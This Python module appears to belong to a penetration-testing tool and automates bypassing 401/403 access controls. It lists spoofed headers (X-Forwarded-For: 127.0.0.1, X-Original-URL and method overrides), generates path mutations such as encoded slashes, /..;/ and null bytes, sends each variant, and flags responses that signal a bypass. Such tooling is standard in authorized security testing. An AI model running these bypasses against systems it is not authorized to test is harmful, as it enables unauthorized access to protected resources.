"""403/login bypass header set + path/method mutation + send helpers."""

from __future__ import annotations

import json
from typing import Any

from praetor import client
from praetor.tools._request_headers import apply_realistic_headers


# Picked from real bug bounty disclosures + auth_bypass.json + WSTG.
_HEADER_BYPASSES: tuple[tuple[str, dict[str, str]], ...] = (
    ("X-Forwarded-For: 127.0.0.1", {"X-Forwarded-For": "127.0.0.1"}),
    ("X-Forwarded-For: localhost", {"X-Forwarded-For": "localhost"}),
    ("X-Real-IP: 127.0.0.1", {"X-Real-IP": "127.0.0.1"}),
    ("X-Originating-IP: 127.0.0.1", {"X-Originating-IP": "127.0.0.1"}),
    ("X-Remote-IP: 127.0.0.1", {"X-Remote-IP": "127.0.0.1"}),
    ("X-Client-IP: 127.0.0.1", {"X-Client-IP": "127.0.0.1"}),
    ("X-Host: localhost", {"X-Host": "localhost"}),
    ("X-Forwarded-Host: localhost", {"X-Forwarded-Host": "localhost"}),
    ("X-Custom-IP-Authorization: 127.0.0.1",
     {"X-Custom-IP-Authorization": "127.0.0.1"}),
    ("X-Original-URL: <path>", {"X-Original-URL": "__PATH__"}),
    ("X-Rewrite-URL: <path>", {"X-Rewrite-URL": "__PATH__"}),
    ("X-Override-URL: <path>", {"X-Override-URL": "__PATH__"}),
    ("Referer: <self>", {"Referer": "__SELF__"}),
    ("X-Forwarded-Proto: http", {"X-Forwarded-Proto": "http"}),
    ("X-HTTP-Method-Override: GET", {"X-HTTP-Method-Override": "GET"}),
    ("X-HTTP-Method: GET", {"X-HTTP-Method": "GET"}),
    ("X-Method-Override: GET", {"X-Method-Override": "GET"}),
)


def _path_mutations(path: str) -> list[tuple[str, str]]:
    """Generate path-normalization bypass variants for one path."""
    if not path:
        path = "/"
    base = path.rstrip("/")
    return [
        ("trailing-slash", path + "/"),
        ("trailing-dot", path + "."),
        ("trailing-semicolon", path + ";"),
        ("trailing-encoded-slash", path + "%2f"),
        ("trailing-encoded-dot", path + "%2e"),
        ("dot-slash", path + "/./"),
        ("double-slash", base + "//"),
        ("dot-dot-semicolon", base + "/..;/"),
        ("uppercase-path", path.upper()),
        ("mixed-case-path", "".join(
            (c.upper() if i % 2 == 0 else c.lower())
            for i, c in enumerate(path))),
        ("null-byte", path + "%00"),
        ("null-byte-suffix", path + "%00.json"),
        ("hash-suffix", path + "%23"),
        ("semicolon-path-param", path + ";a=b"),
    ]


def _method_mutations() -> list[str]:
    """HTTP methods that sometimes bypass auth gates on path-or-method routing."""
    return ["POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD", "TRACE"]


async def _send(url: str, method: str, headers: dict, body: str = "") -> dict:
    payload: dict = {"method": method, "url": url, "headers": headers,
                     "follow_redirects": False}
    if body:
        payload["body"] = body
    return await client.post("/api/http/curl", json=payload)


def _resolve_header_placeholders(
    raw: dict[str, str], path: str, url: str,
) -> dict[str, str]:
    """Substitute __PATH__ and __SELF__ placeholders with the live values."""
    out: dict[str, str] = {}
    for k, v in raw.items():
        if "__PATH__" in v:
            out[k] = v.replace("__PATH__", path or "/")
        elif "__SELF__" in v:
            out[k] = v.replace("__SELF__", url)
        else:
            out[k] = v
    return out


def _row(label: str, status: int, length: int, idx: int, base_status: int) -> str:
    """Format one result row with a bypass-indicator."""
    delta_marker = ""
    if base_status in (401, 403) and status in (200, 302):
        delta_marker = "  *** BYPASS ***"
    elif base_status in (401, 403) and status not in (401, 403, 404):
        delta_marker = "  [?] DELTA"
    return f"  {label:<42}  {status}  {length:>7}b  #{idx:<5}{delta_marker}"


